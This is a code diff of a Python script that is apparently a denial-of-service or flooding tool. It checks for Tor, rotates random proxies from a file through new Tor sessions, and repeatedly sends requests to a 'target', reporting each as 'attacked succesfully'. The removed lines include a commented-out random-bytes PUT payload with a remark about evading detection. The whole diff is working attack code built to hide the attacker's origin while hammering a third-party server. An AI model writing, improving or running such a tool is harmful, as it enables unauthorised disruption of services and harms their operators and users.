@@ -7,29 +7,34 @@ from lib.tor import Tor
 def main():
     counter = 0
     try:
+        tor = Tor()
+        if not tor.tor_installed():
+            print('{}[!]{} Tor is not installed. Exiting...'.format(color.RED, color.END))
+            sys.exit(1)
+
+        start_time = datetime.datetime.now().time().strftime('%H:%M:%S')
+
+        with open('proxy.txt', 'r') as f:
+            proxies = [line.strip() for line in f if line.strip()]
+
         while counter < max_attempts:
-            tor = Tor()
-            if not tor.tor_installed():
-                print('{}[!]{} Tor is not installed. Exiting...'.format(color.RED, color.END))
+            counter += 1
+            proxy = random.choice(proxies)
+            session = tor.new_session(proxies={'http': proxy, 'https': proxy})
+            if session is None:
+                print('{}[!]{} Failed to initialize Tor session. Exiting...'.format(color.RED, color.END))
                 sys.exit(1)
-            else:
-                start_time = datetime.datetime.now().time().strftime('%H:%M:%S')
-                counter += 1
-                # Init a new Tor session
-                with open('proxy.txt', 'r') as f:
-                    proxies = [line.strip() for line in f if line.strip()]
-                proxy = random.choice(proxies)
-                session = tor.new_session(proxies={'http': proxy, 'https': proxy})
-                print('{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END))
-                print('\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))
-                # Getting data from the server
+
+            print('{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END))
+            print('\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))
+
+            try:
                 print('{}[*]{} Getting data from {}...'.format(color.ORANGE, color.END, target))
                 session.get(target)
-                # Putting data (omitted, maybe it makes detection easier)
-                # random_bytes = random._urandom(1490)
-                # print('{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target))
-                # session.put(target, random_bytes)
                 print('{}[*]{} Target {} was attacked succesfully'.format(color.ORANGE, color.END, target))
+            except Exception as e:
+                print('{}[!]{} Error: {}'.format(color.RED, color.END, e))
+
     except KeyboardInterrupt:
         pass
     except Exception as exception:
